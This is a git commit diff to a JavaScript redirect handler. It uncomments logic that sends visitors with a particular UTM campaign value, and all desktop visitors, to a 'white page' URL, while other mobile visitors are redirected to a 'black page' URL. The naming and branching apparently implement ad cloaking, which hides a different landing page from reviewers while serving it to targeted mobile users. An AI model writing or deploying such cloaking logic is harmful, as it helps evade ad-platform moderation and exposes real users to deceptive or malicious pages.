443bde242b1e0dbdd419934a8e61984828641897
rmeeesumraza <github@snobay.com>
2025-01-15 13:55:20 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -23,30 +23,25 @@ export default function handler(req, res) {
         </html>
     `;
 
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(liveViewHTML);
-    
-    // // Parse the UTM parameters from the request URL
-    // const queryParams = new URLSearchParams(req.url.split('?')[1]);
-    // const utmCampaign = queryParams.get('utm_campaign');
+    // Parse the UTM parameters from the request URL
+    const queryParams = new URLSearchParams(req.url.split('?')[1]);
+    const utmCampaign = queryParams.get('utm_campaign');
   
-    // // Get the User-Agent from the request headers
-    // const userAgent = req.headers['user-agent'] || '';
-    // const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-
-
+    // Get the User-Agent from the request headers
+    const userAgent = req.headers['user-agent'] || '';
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
     
-    // // Redirection logic
-    // if (utmCampaign === '__AID_NAME__') {
-    //   // UTM campaign 'l1' takes priority for both desktop and mobile
-    //   res.writeHead(302, { Location: whitePageURL });
-    // } else if (isMobileDevice) {
-    //   // Mobile devices without 'l1' campaign
-    //   res.writeHead(302, { Location: blackPageURL });
-    // } else {
-    //   // Desktop devices without 'l1' campaign
-    //   res.writeHead(302, { Location: whitePageURL });
-    // }
+    // Redirection logic
+    if (utmCampaign === '__AID_NAME__') {
+      // UTM campaign 'l1' takes priority for both desktop and mobile
+      res.writeHead(302, { Location: whitePageURL });
+    } else if (isMobileDevice) {
+      // Mobile devices without 'l1' campaign
+      res.writeHead(302, { Location: blackPageURL });
+    } else {
+      // Desktop devices without 'l1' campaign
+      res.writeHead(302, { Location: whitePageURL });
+    }
   
-    // res.end();
+    res.end();
   }
